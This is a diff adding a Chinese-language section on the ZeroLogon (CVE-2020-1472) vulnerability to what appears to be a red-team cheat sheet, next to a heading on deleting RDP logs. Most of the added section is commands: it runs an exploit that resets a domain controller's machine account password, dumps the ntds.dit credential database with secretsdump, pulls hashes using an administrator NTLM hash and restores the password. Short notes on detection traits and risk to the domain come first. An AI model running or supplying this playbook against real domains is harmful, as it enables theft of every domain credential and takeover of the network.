@@ -731,6 +731,46 @@ plugin = socks5
 
 ```
 
+## ZeroLogon
+
+- 产生日志 4742(利用成功), 5580(利用失败) 
+- 流量特征明显
+- 会被av直接秒
+- 有可能会导致目标脱域
+- 代理不稳，容易出问题
+
+
+
+```
+ git clone https://github.com/mstxq17/cve-2020-1472.git
+ 
+ python3 zerologon_tester.py Dc02 172.23.119.120 域外检测
+ 
+ PingCastle.exe --server 172.23.119.120 --scanner zerologon --scmode-dc 域内检测
+ 
+```
+
+洞清空目标域控机器账户密码
+```
+python3 cve-2020-1472-exploit.py Dc02$ 172.23.119.120
+
+```
+无密码远程提取 ntds.dit
+```
+python3 secretsdump.py qq.local/'Dc02$'@172.23.119.120 -no-pass -outputfile qq.local.ntds.hash
+```
+
+用 administrator 域管账户 hash 远程导出域控机器账户 hash [hex 格式]
+```
+python3 secretsdump.py -hashes :ccef208c6485269c20db2cad21734fe7 qq/administrator@172.23.119.120
+```
+用上面的 hex 还原目标域控机器账户密码
+```
+python3 restorepassword.py Dc02@Dc02 -target-ip 172.23.119.120 -hexpass daf1d2acc25d2e54218921737a40d58192b9bcdf089ddbeaf9f7931571b07916f96e2c51d8d00f56d2440c13c0e5586e2dafd1669e37131***
+
+```
+
+
 
 ## 删rdp日志
 
